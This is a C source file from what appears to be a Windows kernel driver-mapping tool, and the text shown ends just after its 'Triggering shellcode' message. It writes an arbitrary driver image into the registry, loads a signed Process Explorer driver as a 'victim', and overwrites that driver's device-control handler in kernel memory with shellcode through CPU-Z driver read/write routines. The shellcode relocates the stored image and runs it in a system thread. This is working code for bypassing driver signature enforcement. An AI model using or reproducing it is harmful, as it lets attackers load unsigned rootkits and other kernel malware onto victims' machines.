/*******************************************************************************
*
*  (C) COPYRIGHT AUTHORS, 2018
*
*  TITLE:       DRVMAP.C
*
*  VERSION:     1.01
*
*  DATE:        24 Feb 2018
*
*  Driver mapping routines.
*
* THIS CODE AND INFORMATION IS PROVIDED "AS IS" WITHOUT WARRANTY OF
* ANY KIND, EITHER EXPRESSED OR IMPLIED, INCLUDING BUT NOT LIMITED
* TO THE IMPLIED WARRANTIES OF MERCHANTABILITY AND/OR FITNESS FOR A
* PARTICULAR PURPOSE.
*
*******************************************************************************/
#include "global.h"
#include "irp.h"

//
// Mark Explorer driver. Simple code, no restrictions, nice signature, small size.
//
#define MR_PE152    L"procexp152"

#define SCM_DB_KEY  L"\\REGISTRY\\MACHINE\\System\\CurrentControlSet\\Services\\"

typedef ULONG(NTAPI *pfnDbgPrint)(
    _In_ PCHAR Format,
    ...);

typedef PVOID(NTAPI *pfnExAllocatePool)(
    _In_ POOL_TYPE PoolType,
    _In_ SIZE_T NumberOfBytes);

typedef VOID(NTAPI *pfnExFreePool)(
    _In_ PVOID P);

typedef NTSTATUS(NTAPI *pfnPsCreateSystemThread)(
    _Out_ PHANDLE ThreadHandle,
    _In_ ULONG DesiredAccess,
    _In_opt_ POBJECT_ATTRIBUTES ObjectAttributes,
    _In_opt_  HANDLE ProcessHandle,
    _Out_opt_ PCLIENT_ID ClientId,
    _In_ PKSTART_ROUTINE StartRoutine,
    _In_opt_ PVOID StartContext);

typedef NTSTATUS(NTAPI *pfnZwClose)(
    _In_ HANDLE Handle);

typedef NTSTATUS(NTAPI *pfnZwOpenKey)(
    _Out_ PHANDLE            KeyHandle,
    _In_  ACCESS_MASK        DesiredAccess,
    _In_  POBJECT_ATTRIBUTES ObjectAttributes);

typedef NTSTATUS(NTAPI *pfnZwQueryValueKey)(
    _In_      HANDLE                      KeyHandle,
    _In_      PUNICODE_STRING             ValueName,
    _In_      KEY_VALUE_INFORMATION_CLASS KeyValueInformationClass,
    _Out_opt_ PVOID                       KeyValueInformation,
    _In_      ULONG                       Length,
    _Out_     PULONG                      ResultLength);

typedef VOID(NTAPI *pfnIofCompleteRequest)(
    _In_ VOID  *Irp,
    _In_ CCHAR PriorityBoost);

typedef struct _FUNC_TABLE {
    pfnExAllocatePool ExAllocatePool;
    pfnExFreePool ExFreePool;
    pfnPsCreateSystemThread PsCreateSystemThread;
    pfnIofCompleteRequest IofCompleteRequest;
    pfnZwClose ZwClose;
    pfnZwOpenKey ZwOpenKey;
    pfnZwQueryValueKey ZwQueryValueKey;
    pfnDbgPrint DbgPrint;
} FUNC_TABLE, *PFUNC_TABLE;

#ifdef _DEBUG
#define BOOTSTRAPCODE_SIZE 2048
#else
#define BOOTSTRAPCODE_SIZE 944
#endif

//sizeof = 1024 in Release
// WARNING: shellcode DOESN'T WORK in DEBUG
typedef struct _SHELLCODE {
    BYTE InitCode[16];
    BYTE BootstrapCode[BOOTSTRAPCODE_SIZE];
    FUNC_TABLE Import;
} SHELLCODE, *PSHELLCODE;

SHELLCODE *g_ShellCode;

/*
* VictimLoadUnload
*
* Purpose:
*
* Load/Unload driver using Native API.
* This routine will try to force unload driver if Force parameter set to TRUE.
*
*/
BOOL VictimLoadUnload(
    _In_ LPWSTR Name,
    _In_ LPWSTR ImagePath,
    _In_ BOOL Force,
    _In_ BOOL Unload,
    _Out_ NTSTATUS *ErrorStatus)
{
    BOOLEAN bWasEnabled;
    ULONG Data;
    NTSTATUS status;
    HANDLE hKey = NULL;
    OBJECT_ATTRIBUTES obja;
    UNICODE_STRING str;
    WCHAR szKey[MAX_PATH];

    _strcpy(szKey, SCM_DB_KEY);
    _strcat(szKey, Name);
    RtlInitUnicodeString(&str, szKey);
    InitializeObjectAttributes(&obja, &str, OBJ_CASE_INSENSITIVE, 0, 0);

    status = NtCreateKey(&hKey, KEY_ALL_ACCESS,
        &obja, 0,
        NULL, REG_OPTION_NON_VOLATILE,
        NULL);

    if (NT_SUCCESS(status)) {

        Data = SERVICE_ERROR_NORMAL;
        RtlInitUnicodeString(&str, L"ErrorControl");
        status = NtSetValueKey(hKey, &str, 0, REG_DWORD, &Data, sizeof(ULONG));
        if (NT_SUCCESS(status)) {

            Data = SERVICE_DEMAND_START;
            RtlInitUnicodeString(&str, L"Start");
            status = NtSetValueKey(hKey, &str, 0, REG_DWORD, &Data, sizeof(ULONG));
            if (NT_SUCCESS(status)) {

                Data = SERVICE_KERNEL_DRIVER;
                RtlInitUnicodeString(&str, L"Type");
                status = NtSetValueKey(hKey, &str, 0, REG_DWORD, &Data, sizeof(ULONG));
                if (NT_SUCCESS(status)) {

                    RtlInitUnicodeString(&str, L"ImagePath");
                    Data = (ULONG)((1 + _strlen(ImagePath)) * sizeof(WCHAR));
                    status = NtSetValueKey(hKey, &str, 0, REG_SZ, ImagePath, Data);
                    if (NT_SUCCESS(status)) {

                        status = RtlAdjustPrivilege(SE_LOAD_DRIVER_PRIVILEGE,
                            TRUE, FALSE, &bWasEnabled);
                        if (NT_SUCCESS(status)) {

                            RtlInitUnicodeString(&str, szKey);

                            if (Unload) {
                                status = NtUnloadDriver(&str);
                            }
                            else {
                                status = NtLoadDriver(&str);

                                if ((status == STATUS_IMAGE_ALREADY_LOADED) ||
                                    (status == STATUS_OBJECT_NAME_COLLISION)) {

                                    if (Force) {
                                        status = NtUnloadDriver(&str);
                                        if (NT_SUCCESS(status)) {
                                            status = NtLoadDriver(&str);
                                        }
                                    }
                                }
                            }
                            RtlAdjustPrivilege(SE_LOAD_DRIVER_PRIVILEGE, FALSE, FALSE, &bWasEnabled);
                        }
                    }
                }
            }
        }
        NtYieldExecution();
        NtDeleteKey(hKey);
        NtClose(hKey);
    }

    *ErrorStatus = status;
    return NT_SUCCESS(status);
}

/*
* ExAllocatePoolTest
*
* Purpose:
*
* User mode test routine.
*
*/
PVOID NTAPI ExAllocatePoolTest(
    _In_ POOL_TYPE PoolType,
    _In_ SIZE_T NumberOfBytes)
{
    PVOID P;
    UNREFERENCED_PARAMETER(PoolType);

    P = VirtualAlloc(NULL, NumberOfBytes, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (P) RtlSecureZeroMemory(P, NumberOfBytes);

    return P;
}

/*
* ExFreePoolTest
*
* Purpose:
*
* User mode test routine.
*
*/
VOID NTAPI ExFreePoolTest(
    _In_ PVOID P)
{
    VirtualFree(P, 0, MEM_RELEASE);
}

/*
* IofCompleteRequestTest
*
* Purpose:
*
* User mode test routine.
*/
VOID IofCompleteRequestTest(
    _In_ VOID *Irp,
    _In_ CCHAR PriorityBoost)
{
    UNREFERENCED_PARAMETER(Irp);
    UNREFERENCED_PARAMETER(PriorityBoost);
    return;
}

/*
* PsCreateSystemThreadTest
*
* Purpose:
*
* User mode test routine.
*
*/
NTSTATUS NTAPI PsCreateSystemThreadTest(
    _Out_ PHANDLE ThreadHandle,
    _In_ ULONG DesiredAccess,
    _In_opt_ POBJECT_ATTRIBUTES ObjectAttributes,
    _In_opt_  HANDLE ProcessHandle,
    _Out_opt_ PCLIENT_ID ClientId,
    _In_ PKSTART_ROUTINE StartRoutine,
    _In_opt_ PVOID StartContext)
{
    UNREFERENCED_PARAMETER(ThreadHandle);
    UNREFERENCED_PARAMETER(DesiredAccess);
    UNREFERENCED_PARAMETER(ObjectAttributes);
    UNREFERENCED_PARAMETER(ProcessHandle);
    UNREFERENCED_PARAMETER(ClientId);
    UNREFERENCED_PARAMETER(StartRoutine);
    UNREFERENCED_PARAMETER(StartContext);
    return STATUS_SUCCESS;
}

IO_STACK_LOCATION g_testIostl;

/*
* IoGetCurrentIrpStackLocationTest
*
* Purpose:
*
* User mode test routine.
*
*/
FORCEINLINE
PIO_STACK_LOCATION
IoGetCurrentIrpStackLocationTest(
    _In_ PIRP Irp
)
{
    UNREFERENCED_PARAMETER(Irp);
    g_testIostl.MajorFunction = IRP_MJ_CREATE;
    return &g_testIostl;
}


/*
* SizeOfProc
*
* Purpose:
*
* Very simplified. Return size of procedure when first ret meet.
*
*/
ULONG SizeOfProc(
    _In_ PBYTE FunctionPtr)
{
    ULONG   c = 0;
    UCHAR  *p;
    hde64s  hs;

    __try {

        do {
            p = FunctionPtr + c;
            hde64_disasm(p, &hs);
            if (hs.flags & F_ERROR)
                break;
            c += hs.len;

        } while (*p != 0xC3);

    }
    __except (EXCEPTION_EXECUTE_HANDLER) {
        return 0;
    }
    return c;
}

/*
* FakeDispatchRoutine
*
* Purpose:
*
* Bootstrap shellcode.
* Read image from registry, process relocs and run it.
*
* IRQL: PASSIVE_LEVEL
*
*/
NTSTATUS NTAPI FakeDispatchRoutine(
    _In_ struct _DEVICE_OBJECT *DeviceObject,
    _Inout_ struct _IRP *Irp,
    _In_ PSHELLCODE ShellCode)
{
    NTSTATUS                        status;
    ULONG                           returnLength = 0, isz, dummy;
    HANDLE                          hKey = NULL, hThread;
    UNICODE_STRING                  str;
    OBJECT_ATTRIBUTES               obja;
    KEY_VALUE_PARTIAL_INFORMATION   keyinfo;
    KEY_VALUE_PARTIAL_INFORMATION  *pkeyinfo;
    ULONG_PTR                       Image, exbuffer, pos;

    PIO_STACK_LOCATION              StackLocation;

    PIMAGE_DOS_HEADER               dosh;
    PIMAGE_FILE_HEADER              fileh;
    PIMAGE_OPTIONAL_HEADER          popth;
    PIMAGE_BASE_RELOCATION          rel;

    DWORD_PTR                       delta;
    LPWORD                          chains;
    DWORD                           c, p, rsz;

    WCHAR                           szRegistryKey[] = {
        L'\\', L'R', L'E', L'G', L'I', L'S', L'T', L'R', L'Y', L'\\',\
        L'M', L'A', L'C', L'H', L'I', L'N', L'E', 0
    };

    USHORT                          cbRegistryKey = sizeof(szRegistryKey) - sizeof(WCHAR);

    WCHAR                           szValueKey[] = { L'~', 0 };

    USHORT                          cbValueKey = sizeof(szValueKey) - sizeof(WCHAR);

    UNREFERENCED_PARAMETER(DeviceObject);

#ifdef _DEBUG
    StackLocation = IoGetCurrentIrpStackLocationTest(Irp);
#else
    StackLocation = IoGetCurrentIrpStackLocation(Irp);
#endif

    if (StackLocation->MajorFunction == IRP_MJ_CREATE) {

        str.Buffer = szRegistryKey;
        str.Length = cbRegistryKey;
        str.MaximumLength = str.Length + sizeof(UNICODE_NULL);

#ifdef _DEBUG
        InitializeObjectAttributes(&obja, &str, OBJ_CASE_INSENSITIVE, 0, 0);
#else
        InitializeObjectAttributes(&obja, &str, OBJ_CASE_INSENSITIVE | OBJ_KERNEL_HANDLE, 0, 0);
#endif

        status = ShellCode->Import.ZwOpenKey(&hKey, KEY_READ, &obja);
        if (NT_SUCCESS(status)) {

            str.Buffer = szValueKey;
            str.Length = cbValueKey;
            str.MaximumLength = str.Length + sizeof(UNICODE_NULL);

            status = ShellCode->Import.ZwQueryValueKey(hKey, &str, KeyValuePartialInformation,
                &keyinfo, sizeof(KEY_VALUE_PARTIAL_INFORMATION), &returnLength);

            if ((status == STATUS_BUFFER_OVERFLOW) ||
                (status == STATUS_BUFFER_TOO_SMALL))
            {
                pkeyinfo = (KEY_VALUE_PARTIAL_INFORMATION*)ShellCode->Import.ExAllocatePool(NonPagedPool, returnLength);
                if (pkeyinfo) {

                    status = ShellCode->Import.ZwQueryValueKey(hKey, &str, KeyValuePartialInformation,
                        (PVOID)pkeyinfo, returnLength, &dummy);
                    if (NT_SUCCESS(status)) {

                        Image = (ULONG_PTR)&pkeyinfo->Data[0];
                        dosh = (PIMAGE_DOS_HEADER)Image;
                        fileh = (PIMAGE_FILE_HEADER)(Image + sizeof(DWORD) + dosh->e_lfanew);
                        popth = (PIMAGE_OPTIONAL_HEADER)((PBYTE)fileh + sizeof(IMAGE_FILE_HEADER));
                        isz = popth->SizeOfImage;

                        exbuffer = (ULONG_PTR)ShellCode->Import.ExAllocatePool(
                            NonPagedPool, isz + PAGE_SIZE) + PAGE_SIZE;
                        if (exbuffer != 0) {

                            exbuffer &= ~(PAGE_SIZE - 1);

                            if (popth->NumberOfRvaAndSizes > IMAGE_DIRECTORY_ENTRY_BASERELOC)
                                if (popth->DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress != 0)
                                {
                                    rel = (PIMAGE_BASE_RELOCATION)((PBYTE)Image +
                                        popth->DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress);

                                    rsz = popth->DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].Size;
                                    delta = (DWORD_PTR)exbuffer - popth->ImageBase;
                                    c = 0;

                                    while (c < rsz) {
                                        p = sizeof(IMAGE_BASE_RELOCATION);
                                        chains = (LPWORD)((PBYTE)rel + p);

                                        while (p < rel->SizeOfBlock) {

                                            switch (*chains >> 12) {
                                            case IMAGE_REL_BASED_HIGHLOW:
                                                *(LPDWORD)((ULONG_PTR)Image + rel->VirtualAddress + (*chains & 0x0fff)) += (DWORD)delta;
                                                break;
                                            case IMAGE_REL_BASED_DIR64:
                                                *(PULONGLONG)((ULONG_PTR)Image + rel->VirtualAddress + (*chains & 0x0fff)) += delta;
                                                break;
                                            }

                                            chains++;
                                            p += sizeof(WORD);
                                        }

                                        c += rel->SizeOfBlock;
                                        rel = (PIMAGE_BASE_RELOCATION)((PBYTE)rel + rel->SizeOfBlock);
                                    }
                                }

                            isz >>= 3;
                            for (pos = 0; pos < isz; pos++)
                                ((PULONG64)exbuffer)[pos] = ((PULONG64)Image)[pos];

                            hThread = NULL;
                            InitializeObjectAttributes(&obja, NULL, OBJ_KERNEL_HANDLE, NULL, NULL);
                            if (NT_SUCCESS(ShellCode->Import.PsCreateSystemThread(&hThread, THREAD_ALL_ACCESS, &obja, NULL, NULL,
                                (PKSTART_ROUTINE)(exbuffer + popth->AddressOfEntryPoint), NULL)))
                            {
                                ShellCode->Import.ZwClose(hThread);
                            }
                        }
                    }
                    ShellCode->Import.ExFreePool(pkeyinfo);
                }
            }
            ShellCode->Import.ZwClose(hKey);
        }
    }
    ShellCode->Import.IofCompleteRequest(Irp, 0);
    return STATUS_SUCCESS;
}

/*
* FakeDispatchRoutine2
*
* Purpose:
*
* Bootstrap test shellcode.
*
* IRQL: PASSIVE_LEVEL
*
*/
NTSTATUS NTAPI FakeDispatchRoutine2(
    _In_ struct _DEVICE_OBJECT *DeviceObject,
    _Inout_ struct _IRP *Irp,
    _In_ PSHELLCODE ShellCode)
{
    PIO_STACK_LOCATION                  StackLocation;
    CHAR                                szTest1[] = {
        'O', 'p', 'e', 'n', '\n', 0
    };
    CHAR                                szTest2[] = {
        'C', 'l', 'o', 's', 'e', '\n', 0
    };

    UNREFERENCED_PARAMETER(DeviceObject);

    StackLocation = IoGetCurrentIrpStackLocation(Irp);

    if (StackLocation->MajorFunction == IRP_MJ_CREATE) {
        ShellCode->Import.DbgPrint(szTest1);
    }
    else {
        if (StackLocation->MajorFunction == IRP_MJ_CLOSE) {
            ShellCode->Import.DbgPrint(szTest2);
        }
    }
    ShellCode->Import.IofCompleteRequest(Irp, 0);
    return STATUS_SUCCESS;
}

/*
* StorePayload
*
* Purpose:
*
* Load input file as image, resolve import and store result in registry.
*
*/
BOOL StorePayload(
    _In_ LPWSTR lpFileName,
    _In_ ULONG_PTR KernelImage,
    _In_ ULONG_PTR KernelBase)
{
    BOOL bSuccess = FALSE;
    HKEY hKey = NULL;
    PVOID DataBuffer = NULL;
    LRESULT lResult;

    NTSTATUS status;
    ULONG isz;
    PVOID Image = NULL;
    PIMAGE_NT_HEADERS FileHeader;
    UNICODE_STRING ustr;
    WCHAR szMsg[100];

    ULONG DllCharacteristics = IMAGE_FILE_EXECUTABLE_IMAGE;

    //
    // Map input file as image.
    //
    RtlInitUnicodeString(&ustr, lpFileName);
    status = LdrLoadDll(NULL, &DllCharacteristics, &ustr, &Image);
    if ((!NT_SUCCESS(status)) || (Image == NULL)) {
        supPrintText(TEXT("\r\n[!] Error while loading input driver file"));
        return FALSE;
    }
    else {
        _strcpy(szMsg, TEXT("\r\n[+] Input driver file loaded at 0x"));
        u64tohex((ULONG_PTR)Image, _strend(szMsg));
        supPrintText(szMsg);
    }

    FileHeader = RtlImageNtHeader(Image);
    if (FileHeader == NULL) {
        supPrintText(TEXT("\r\n[!] Error, invalid NT header"));
        return FALSE;
    }

    //
    // Resolve import (ntoskrnl only) and write buffer to registry.
    //
    isz = FileHeader->OptionalHeader.SizeOfImage;

    DataBuffer = supHeapAlloc(isz);
    if (DataBuffer) {
        RtlCopyMemory(DataBuffer, Image, isz);

        supPrintText(TEXT("\r\n[+] Resolving kernel import for input driver"));
        ldrResolveKernelImport((ULONG_PTR)DataBuffer, KernelImage, KernelBase);

        lResult = RegOpenKey(HKEY_LOCAL_MACHINE, NULL, &hKey);
        if ((lResult == ERROR_SUCCESS) && (hKey != NULL)) {

            lResult = RegSetKeyValue(hKey, NULL, TEXT("~"), REG_BINARY,
                DataBuffer, isz);

            bSuccess = (lResult == ERROR_SUCCESS);

            RegCloseKey(hKey);
        }
        supHeapFree(DataBuffer);
    }
    return bSuccess;
}

/*
* SetupShellCode
*
* Purpose:
*
* Construct shellcode data, init code.
*
*/
VOID SetupShellCode(
    _In_ LPWSTR lpDriverFileName)
{
    BOOL bCond = FALSE;
    NTSTATUS status;
    ULONG ProcedureSize;
    UNICODE_STRING ustr;

    ULONG_PTR KernelBase, KernelImage = 0, ConvertedFuncPtr = 0;

    WCHAR szMsg[200];

    do {

        KernelBase = supGetNtOsBase();
        if (KernelBase) {
            _strcpy(szMsg, TEXT("\r\n[+] Loaded ntoskrnl base = 0x"));
            u64tohex(KernelBase, _strend(szMsg));
            supPrintText(szMsg);
        }
        else {
            supPrintText(TEXT("\r\n[!] Cannot query ntoskrnl loaded base, abort"));
            break;
        }

        //
        // Preload ntoskrnl.exe
        // 
        RtlInitUnicodeString(&ustr, L"ntoskrnl.exe");
        status = LdrLoadDll(NULL, NULL, &ustr, (PVOID)&KernelImage);

        if ((!NT_SUCCESS(status)) || (KernelImage == 0)) {
            supPrintText(TEXT("\r\n[!] Error while loading ntoskrnl.exe"));
            break;
        }
        else {
            _strcpy(szMsg, TEXT("\r\n[+] Ntoskrnl.exe mapped at 0x"));
            u64tohex(KernelImage, _strend(szMsg));
            supPrintText(szMsg);
        }

        //
        // Store input file in registry.
        //
        if (!StorePayload(lpDriverFileName, KernelImage, KernelBase)) {
            supPrintText(TEXT("\r\n[!] Cannot write payload to registry, abort"));
            break;
        }

        //
        // Allocate shellcode.
        //
        g_ShellCode = (SHELLCODE*)VirtualAlloc(NULL, sizeof(SHELLCODE),
            MEM_RESERVE | MEM_COMMIT,
            PAGE_EXECUTE_READWRITE);

        if (g_ShellCode == NULL)
            break;

        RtlSecureZeroMemory(g_ShellCode, sizeof(SHELLCODE));

        //
        // Build initial code part.
        //
        // 00 call +5
        // 05 pop r8
        // 07 sub r8, 5
        // 0B jmps 10 
        // 0D int 3
        // 0E int 3
        // 0F int 3
        // 10 code


        //int 3
        memset(g_ShellCode->InitCode, 0xCC, sizeof(g_ShellCode->InitCode));

        //call +5
        g_ShellCode->InitCode[0x0] = 0xE8;
        g_ShellCode->InitCode[0x1] = 0x00;
        g_ShellCode->InitCode[0x2] = 0x00;
        g_ShellCode->InitCode[0x3] = 0x00;
        g_ShellCode->InitCode[0x4] = 0x00;

        //pop r8
        g_ShellCode->InitCode[0x5] = 0x41;
        g_ShellCode->InitCode[0x6] = 0x58;

        //sub r8, 5
        g_ShellCode->InitCode[0x7] = 0x49;
        g_ShellCode->InitCode[0x8] = 0x83;
        g_ShellCode->InitCode[0x9] = 0xE8;
        g_ShellCode->InitCode[0xA] = 0x05;

        // jmps 
        g_ShellCode->InitCode[0xB] = 0xEB;
        g_ShellCode->InitCode[0xC] = 0x03;

        //
        // Remember function pointers.
        //

        //
        // 1. ExAllocatePoolWithTag
        // 
        ConvertedFuncPtr = ldrGetProcAddress(KernelBase, KernelImage, "ExAllocatePool");
        if (ConvertedFuncPtr == 0) {
            supPrintText(TEXT("\r\n[!] Error, ExAllocatePool address not found"));
            break;
        }
        else {
            _strcpy(szMsg, TEXT("\r\n[+] ExAllocatePool 0x"));
            u64tohex(ConvertedFuncPtr, _strend(szMsg));
            supPrintText(szMsg);
        }
        g_ShellCode->Import.ExAllocatePool = (pfnExAllocatePool)ConvertedFuncPtr;

        //
        // 2. ExFreePoolWithTag
        //
        ConvertedFuncPtr = ldrGetProcAddress(KernelBase, KernelImage, "ExFreePool");
        if (ConvertedFuncPtr == 0) {
            supPrintText(TEXT("\r\n[!] Error, ExFreePool address not found"));
            break;
        }
        else {
            _strcpy(szMsg, TEXT("\r\n[+] ExFreePool 0x"));
            u64tohex(ConvertedFuncPtr, _strend(szMsg));
            supPrintText(szMsg);
        }
        g_ShellCode->Import.ExFreePool = (pfnExFreePool)ConvertedFuncPtr;

        //
        // 3. PsCreateSystemThread
        // 
        ConvertedFuncPtr = ldrGetProcAddress(KernelBase, KernelImage, "PsCreateSystemThread");
        if (ConvertedFuncPtr == 0) {
            supPrintText(TEXT("\r\n[!] Error, PsCreateSystemThread address not found"));
            break;
        }
        else {
            _strcpy(szMsg, TEXT("\r\n[+] PsCreateSystemThread 0x"));
            u64tohex(ConvertedFuncPtr, _strend(szMsg));
            supPrintText(szMsg);
        }
        g_ShellCode->Import.PsCreateSystemThread = (pfnPsCreateSystemThread)ConvertedFuncPtr;

        //
        // 4. IofCompleteRequest
        // 
        ConvertedFuncPtr = ldrGetProcAddress(KernelBase, KernelImage, "IofCompleteRequest");
        if (ConvertedFuncPtr == 0) {
            supPrintText(TEXT("\r\n[!] Error, IofCompleteRequest address not found"));
            break;
        }
        else {
            _strcpy(szMsg, TEXT("\r\n[+] IofCompleteRequest 0x"));
            u64tohex(ConvertedFuncPtr, _strend(szMsg));
            supPrintText(szMsg);
        }
        g_ShellCode->Import.IofCompleteRequest = (pfnIofCompleteRequest)ConvertedFuncPtr;

        //
        // 5. ZwClose
        // 
        ConvertedFuncPtr = ldrGetProcAddress(KernelBase, KernelImage, "ZwClose");
        if (ConvertedFuncPtr == 0) {
            supPrintText(TEXT("\r\n[!] Error, ZwClose address not found"));
            break;
        }
        else {
            _strcpy(szMsg, TEXT("\r\n[+] ZwClose 0x"));
            u64tohex(ConvertedFuncPtr, _strend(szMsg));
            supPrintText(szMsg);
        }
        g_ShellCode->Import.ZwClose = (pfnZwClose)ConvertedFuncPtr;

        //
        // 6. ZwOpenKey
        // 
        ConvertedFuncPtr = ldrGetProcAddress(KernelBase, KernelImage, "ZwOpenKey");
        if (ConvertedFuncPtr == 0) {
            supPrintText(TEXT("\r\n[!] Error, ZwOpenKey address not found"));
            break;
        }
        else {
            _strcpy(szMsg, TEXT("\r\n[+] ZwOpenKey 0x"));
            u64tohex(ConvertedFuncPtr, _strend(szMsg));
            supPrintText(szMsg);
        }
        g_ShellCode->Import.ZwOpenKey = (pfnZwOpenKey)ConvertedFuncPtr;

        //
        // 7. ZwQueryValueKey
        // 
        ConvertedFuncPtr = ldrGetProcAddress(KernelBase, KernelImage, "ZwQueryValueKey");
        if (ConvertedFuncPtr == 0) {
            supPrintText(TEXT("\r\n[!] Error, ZwQueryValueKey address not found"));
            break;
        }
        else {
            _strcpy(szMsg, TEXT("\r\n[+] ZwQueryValueKey 0x"));
            u64tohex(ConvertedFuncPtr, _strend(szMsg));
            supPrintText(szMsg);
        }
        g_ShellCode->Import.ZwQueryValueKey = (pfnZwQueryValueKey)ConvertedFuncPtr;

        //
        // 8. DbgPrint (unused in Release build)
        // 
        ConvertedFuncPtr = ldrGetProcAddress(KernelBase, KernelImage, "DbgPrint");
        if (ConvertedFuncPtr == 0) {
            supPrintText(TEXT("\r\n[!] Error, DbgPrint address not found"));
            break;
        }
        else {
            _strcpy(szMsg, TEXT("\r\n[+] DbgPrint 0x"));
            u64tohex(ConvertedFuncPtr, _strend(szMsg));
            supPrintText(szMsg);
        }
        g_ShellCode->Import.DbgPrint = (pfnDbgPrint)ConvertedFuncPtr;

        //
        // Shellcode test, unused in Release build.
        //
#ifdef _DEBUG
        g_ShellCode->Import.ZwClose = &NtClose;
        g_ShellCode->Import.ZwOpenKey = &NtOpenKey;
        g_ShellCode->Import.ZwQueryValueKey = &NtQueryValueKey;
        g_ShellCode->Import.ExAllocatePool = &ExAllocatePoolTest;
        g_ShellCode->Import.ExFreePool = &ExFreePoolTest;
        g_ShellCode->Import.IofCompleteRequest = &IofCompleteRequestTest;
        g_ShellCode->Import.PsCreateSystemThread = &PsCreateSystemThreadTest;

        FakeDispatchRoutine(NULL, NULL, g_ShellCode);
        ExitProcess(0);
#endif

        ProcedureSize = SizeOfProc((PBYTE)FakeDispatchRoutine);
        if (ProcedureSize != 0) {

            _strcpy(szMsg, TEXT("\r\n[+] Bootstrap code size = 0x"));
            ultohex(ProcedureSize, _strend(szMsg));
            supPrintText(szMsg);

            if (ProcedureSize > sizeof(g_ShellCode->BootstrapCode)) {
                _strcpy(szMsg, TEXT("\r\n[!] Bootstrap code size exceeds limit, abort"));
                supPrintText(szMsg);
                break;
            }
            memcpy(g_ShellCode->BootstrapCode, FakeDispatchRoutine, ProcedureSize);
            //supWriteBufferToFile(L"out.bin", g_ShellCode->BootstrapCode, ProcedureSize);
        }

        //((void(*)())g_ShellCode->InitCode)();

    } while (bCond);
}

/*
* MapDriver
*
* Purpose:
*
* Load input file into kernel via shellcode mapped through
* physical memory injection in victim driver IRP handler.
*
*/
BOOL MapDriver(
    _In_ LPWSTR lpDriverFileName)
{
    NTSTATUS        status;
    ULONG           NumberOfAttempts;
    HANDLE          hObject = NULL;
    ULONG_PTR       Address, Page, physAddressStart = 0, physAddressEnd = 0;

    WCHAR szBuffer[MAX_PATH * 2];
    WCHAR szDriverFile[MAX_PATH * 3];

    DRIVER_OBJECT drvObject;

    //
    // Check files availability.
    //
    if (!RtlDoesFileExists_U(lpDriverFileName)) {
        supPrintText(TEXT("\r\n[!] Input driver file not found, abort"));
        return FALSE;
    }

    _strcpy(szBuffer, NtCurrentPeb()->ProcessParameters->CurrentDirectory.DosPath.Buffer);
    _strcat(szBuffer, MR_PE152);
    _strcat(szBuffer, TEXT(".sys"));

    if (!RtlDoesFileExists_U(szBuffer)) {
        supPrintText(TEXT("\r\n[!] Victim driver file not found in the current directory, abort"));
        return FALSE;
    }

    szDriverFile[0] = L'\\';
    szDriverFile[1] = L'?';
    szDriverFile[2] = L'?';
    szDriverFile[3] = L'\\';
    szDriverFile[4] = 0;
    _strcpy(&szDriverFile[4], szBuffer);

    NumberOfAttempts = 1;

Reload:

    //
    // Load victim driver (force unload if previously loaded).
    //
    status = STATUS_UNSUCCESSFUL;
    if (!VictimLoadUnload(MR_PE152, szDriverFile, TRUE, FALSE, &status)) {
        RtlSecureZeroMemory(szBuffer, sizeof(szBuffer));
        _strcpy(szBuffer, TEXT("\r\n[!] Cannot load victim driver, status = 0x"));
        ultohex(status, _strend(szBuffer));
        supPrintText(szBuffer);
        return FALSE;
    }
    supPrintText(TEXT("\r\n[+] Victim driver loaded"));

    //
    // Locate DRIVER_OBJECT of the victim driver.
    //
    Address = (ULONG_PTR)ObQueryObject(L"\\Driver", MR_PE152);
    if (Address == 0) {
        supPrintText(TEXT("\r\n[!] Cannot query victim DRIVER_OBJECT address, abort"));
        return FALSE;
    }

    RtlSecureZeroMemory(szBuffer, sizeof(szBuffer));
    _strcpy(szBuffer, TEXT("\r\n[+] DRIVER_OBJECT 0x"));
    u64tohex(Address, _strend(szBuffer));
    supPrintText(szBuffer);

    //
    // Locate IRP_MJ_DEVICE_CONTROL routine.
    //
    RtlSecureZeroMemory(&drvObject, sizeof(DRIVER_OBJECT));
    if (!cpuz_readVirtualMemory(Address, &drvObject, sizeof(DRIVER_OBJECT))) {
        supPrintText(TEXT("\r\n[!] Cannot read victim DRIVER_OBJECT, abort"));
        return FALSE;
    }

    _strcpy(szBuffer, TEXT("\r\n[+] IRP_MJ_DEVICE_CONTROL 0x"));
    u64tohex((ULONG_PTR)drvObject.MajorFunction[IRP_MJ_DEVICE_CONTROL], _strend(szBuffer));
    supPrintText(szBuffer);

    if (drvObject.MajorFunction[IRP_MJ_DEVICE_CONTROL] == NULL) {
        supPrintText(TEXT("\r\n[!] Invalid value of IRP_MJ_DEVICE_CONTROL, abort"));
        return FALSE;
    }

    //
    // Check if shellcode can be placed within the same/next physical page(s).
    //
    Page = ((ULONG_PTR)drvObject.MajorFunction[IRP_MJ_DEVICE_CONTROL] & 0xfffffffffffff000ull);
    if (VirtualToPhysical(Page, &physAddressStart) != 0) {

        Page = ((ULONG_PTR)drvObject.MajorFunction[IRP_MJ_DEVICE_CONTROL] + sizeof(SHELLCODE)) & 0xfffffffffffff000ull;
        if (VirtualToPhysical(Page, &physAddressEnd) != 0) {

            Address = physAddressEnd - physAddressStart;
            if (Address > 4096) {
                supPrintText(TEXT("\r\n[!] Invalid physical address, reload victim driver"));
                NumberOfAttempts += 1;
                if (NumberOfAttempts > 5) {
                    supPrintText(TEXT("\r\n[!] Too many attempts, abort"));
                    return FALSE;
                }
                goto Reload;
            }
        }
        else {
            return FALSE;
        }
    }
    else {
        return FALSE;
    }

    SetupShellCode(lpDriverFileName);

    //
    // Write shellcode to driver.
    //
    if (!cpuz_WriteVirtualMemory((ULONG_PTR)drvObject.MajorFunction[IRP_MJ_DEVICE_CONTROL],
        g_ShellCode, sizeof(SHELLCODE)))
    {
        supPrintText(TEXT("\r\n[!] Error writing shellcode to the target driver, abort"));
        return FALSE;
    }
    else {
        supPrintText(TEXT("\r\n[+] Driver IRP_MJ_DEVICE_CONTROL handler code modified"));
    }

    //
    // Trigger shellcode.
    // Target has the same handlers for IRP_MJ_CREATE/CLOSE/DEVICE_CONTROL
    //
    supPrintText(TEXT("\r\n[+] Triggering shellcode"));
    Sleep(1000);
